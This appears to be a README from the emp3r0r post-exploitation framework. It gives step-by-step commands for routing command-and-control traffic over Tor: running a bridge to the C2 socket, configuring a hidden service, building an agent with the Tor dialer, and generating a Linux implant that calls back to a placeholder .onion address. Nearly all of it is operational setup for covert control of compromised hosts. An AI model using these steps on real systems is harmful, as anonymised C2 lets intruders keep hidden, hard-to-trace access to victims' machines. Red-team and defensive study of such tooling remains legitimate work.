# Tor transport example

This is the reference custom transport: an agent dialer plus a C2 bridge. It is
not compiled into the default agent.

1. Start the C2. Its bridge socket is `<workspace>/bridge.sock` unless
   `bridge_socket` is set in `emp3r0r.json`.
2. Run the bridge:

   ```bash
   go run ./examples/transports/tor/bridge \
     --listen 127.0.0.1:8080 \
     --c2-socket "$HOME/.emp3r0r/bridge.sock"
   ```

3. Point the Tor hidden service at the bridge:

   ```text
   HiddenServiceDir /var/lib/tor/c2/
   HiddenServicePort 80 127.0.0.1:8080
   ```

4. Build an agent stub with the dialer tag:

   ```bash
   python3 core/build.py --build --agent-tags 'with_transport_tor'
   ```

5. Generate an agent in the operator console:

   ```text
   generate --type linux_executable --arch amd64 \
     --cc abcdefghijklmnop.onion:80 \
     --c2-channel-mode tor --allow-custom-transport \
     --transport-option socks5=127.0.0.1:9050
   ```

The dialer connects to the onion service through the agent's local Tor SOCKS5
proxy. Only `SecureConn` ciphertext crosses Tor and the bridge.

See [`docs/CUSTOM_C2.md`](../../../../docs/CUSTOM_C2.md) for the agent dialer API,
the bridge IPC preface, and how to write a new transport.
